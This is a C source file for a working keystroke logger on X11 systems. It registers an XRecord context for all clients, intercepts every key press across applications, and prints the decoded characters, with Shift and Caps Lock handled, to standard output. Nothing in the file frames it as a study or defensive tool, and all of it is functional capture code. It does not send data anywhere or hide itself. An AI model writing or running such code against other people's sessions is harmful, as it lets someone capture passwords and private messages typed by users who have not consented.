#include <X11/XKBlib.h>
#include <X11/Xlib.h>
#include <X11/X.h>
#include <X11/extensions/record.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>



//extern int XQueryKeymap(
//    Display*		/* display ,
//    char [32]		/* keys_return 
//);

//XGetKeyboardControl

XRecordRange	*alloc_range(Display *dpl)
{
	XRecordRange	*rng;
	int		major;
	int		minor;

	if (!XRecordQueryVersion(dpl, &major, &minor))
		exit(1);
	rng = XRecordAllocRange();
	rng->device_events.first = KeyPress;
	rng->device_events.last = KeyPress;
	return (rng);
}

bool	SpecialChar(int Char)
{
	return ((Char >= 24 && Char <= 33) || (Char >= 38 && Char <= 46) || (Char >= 52 && Char <= 58));
}

void	DataBaseOfChar(char *logger)
{
	if (!strcmp(logger, "Return"))
		printf("\n");
	else if (!strcmp(logger, "Tab"))
		printf("\t");
	else if (!strcmp(logger, "space"))
		printf(" ");
	else if (!strcmp(logger, "grave"))
		printf("`");
	else if (!strcmp(logger, "minus"))
		printf("-");
	else if (!strcmp(logger, "equal"))
		printf("=");
	else if (!strcmp(logger, "bracketleft"))
		printf("[");
	else if (!strcmp(logger, "bracketright"))
		printf("]");
	else if (!strcmp(logger, "backslash"))
		printf("\\");
	else if (!strcmp(logger, "semicolon"))
		printf(";");
	else if (!strcmp(logger, "apostrophe"))
		printf("'");
	else if (!strcmp(logger, "comma"))
		printf(",");
	else if (!strcmp(logger, "period"))
		printf(".");
	else if (!strcmp(logger, "slash"))
		printf("/");
	else if (!strcmp(logger, "quotedbl"))
		printf("\"");
	else if (!strcmp(logger, "colon"))
		printf(":");
	else if (!strcmp(logger, "bar"))
		printf("|");
	else if (!strcmp(logger, "braceleft"))
		printf("{");
	else if (!strcmp(logger, "braceright"))
		printf("}");
	else if (!strcmp(logger, "asciitilde"))
		printf("~");
	else if (!strcmp(logger, "exclam"))
		printf("!");
	else if (!strcmp(logger, "at"))
		printf("@");
	else if (!strcmp(logger, "numbersign"))
		printf("#");
	else if (!strcmp(logger, "dollar"))
		printf("$");
	else if (!strcmp(logger, "percent"))
		printf("%%");
	else if (!strcmp(logger, "asciicircum"))
		printf("^");
	else if (!strcmp(logger, "ampersand"))
		printf("&");
	else if (!strcmp(logger, "asterisk"))
		printf("*");
	else if (!strcmp(logger, "parenleft"))
		printf("(");
	else if (!strcmp(logger, "parenright"))
		printf(")");
	else if (!strcmp(logger, "underscore"))
		printf("_");
	else if (!strcmp(logger, "plus"))
		printf("+");
	else if (!strcmp(logger, "less"))
		printf("<");
	else if (!strcmp(logger, "greater"))
		printf(">");
	else if (!strcmp(logger, "question"))
		printf("?");
	fflush(stdout);
}

int	ControlOutput(char *logger)
{
	if (strlen(logger) < 2)
		return (printf("%s", logger), fflush(stdout));
	DataBaseOfChar(logger);
	return (1);
}

void	callback(XPointer xp, XRecordInterceptData *data)
{
	Display		*dpl;
	XKeyboardState	key_board;
	KeySym		sm;
	char		*logger;
	char		bit_map[32];
	bool		level;
	bool		CapsLock;
	unsigned char	key_code;
	unsigned char	type;
	unsigned char	stat;

	level = 0;
	if (data->category == XRecordFromServer)
	{	
		type = data->data[0] & 0x7F;
		key_code = data->data[1];
		stat = data->data[2];
		if (type == KeyPress)
		{

			dpl = XOpenDisplay(NULL);
			XGetKeyboardControl(dpl, &key_board);
			if (SpecialChar((int)key_code) && (key_board.led_mask & 1) == 1)
				level = 1;
			XQueryKeymap(dpl, bit_map);
			if (((bit_map[50 / 8]) & (1 << 50 % 8)) || ((bit_map[62 / 8]) & (1 << 62 % 8)))
				level = !level;
			sm = XkbKeycodeToKeysym(dpl, key_code, 0, (int)level);
			logger = XKeysymToString(sm);
			ControlOutput(logger);
			XCloseDisplay(dpl);
		}
	}
	XRecordFreeData(data);
}

void	active_context(XRecordRange **rng, Display *dpl)
{
	XRecordClientSpec	clt;
	XRecordContext		ctx;
	Status			status;

	clt = XRecordAllClients;
	ctx = XRecordCreateContext(dpl, 0, &clt, 1, rng, 1);
	if (ctx == 0)
	{	
		printf("Error in Create a Context\n");
		exit (1);
	}
	status = XRecordEnableContextAsync(dpl, ctx, callback, NULL);
	while (1)
		XRecordProcessReplies(dpl);
}

int main(void)
{
	Display		*control_dpl;
	XEvent		evn;
	XRecordRange	*rng;

	control_dpl = XOpenDisplay(NULL);
	if (!control_dpl)
	{
		printf("Error Connecting with X Servere\n");
		exit (1);
	}
	rng = alloc_range(control_dpl);
	active_context(&rng, control_dpl);
	XCloseDisplay(control_dpl);
	return (!1);
}

